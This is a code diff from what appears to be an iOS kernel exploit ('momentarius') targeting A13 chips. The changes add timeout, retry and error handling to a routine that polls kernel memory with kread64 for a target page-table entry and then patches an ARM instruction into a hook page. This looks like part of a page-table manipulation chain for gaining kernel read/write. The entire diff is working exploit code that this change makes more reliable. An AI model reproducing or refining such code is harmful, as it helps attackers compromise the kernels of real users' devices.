@@ -62,22 +62,31 @@ static void gfx_write_cachelines(uint64_t shc_in, uint64_t shc_out, uint64_t ttb
 
 static void *wait_for_pte(void *data) {
     uint32_t counter = 0;
+    const uint32_t timeout_ms = 20000;
     usleep(1000);
     
-    while (1) {
+    while (!stop_write) {
         if (counter > 1000 && kread64(momentarius.target_kern_addr) == momentarius.target_pte) {
             *(volatile uint32_t *)data = 0xF100003F; // cmp x1, #0
             asm volatile ("dsb sy");
             usleep(100000);
             
             stop_write = true;
+            debug_log("A13 wait_for_pte success at %u ms\n", counter);
             break;
         }
         
         usleep(1000);
-        if (++counter == 1000) {
+        ++counter;
+        if (counter == 1000 || (counter > 1000 && (counter % 2000) == 0)) {
             gfx_suspend();
             gfx_resume();
+        }
+        if (counter >= timeout_ms) {
+            debug_log("A13 wait_for_pte TIMEOUT after %u ms\n", counter);
+            momentarius_wait_failed = true;
+            stop_write = true;
+            break;
         }
     }
     return NULL;
@@ -319,10 +328,17 @@ int momentarius_init_A13(void) {
     uint64_t hook_output = hook_page + (momentarius.gfx.hook_offset & 0x3fff);
     
     pthread_t wait_thread = NULL;
+    momentarius_wait_failed = false;
+    stop_write = false;
     pthread_create(&wait_thread, NULL, wait_for_pte, (void *)hook_input);
     
     gfx_write_cachelines(shc_input, shc_output, ttbr1_input, ttbr1_output, hook_input, hook_output);
     pthread_join(wait_thread, NULL);
+
+    if (momentarius_wait_failed) {
+        debug_log("momentarius_init_A13 failed: wait_for_pte timeout\n");
+        return -1;
+    }
     
     momentarius.target_rw_pte = momentarius.self_ref_pt_kva + ((momentarius.target_rw_mapping >> 11) & 0x3FF8);
     momentarius.orig_pte = kread64(momentarius.target_rw_pte);
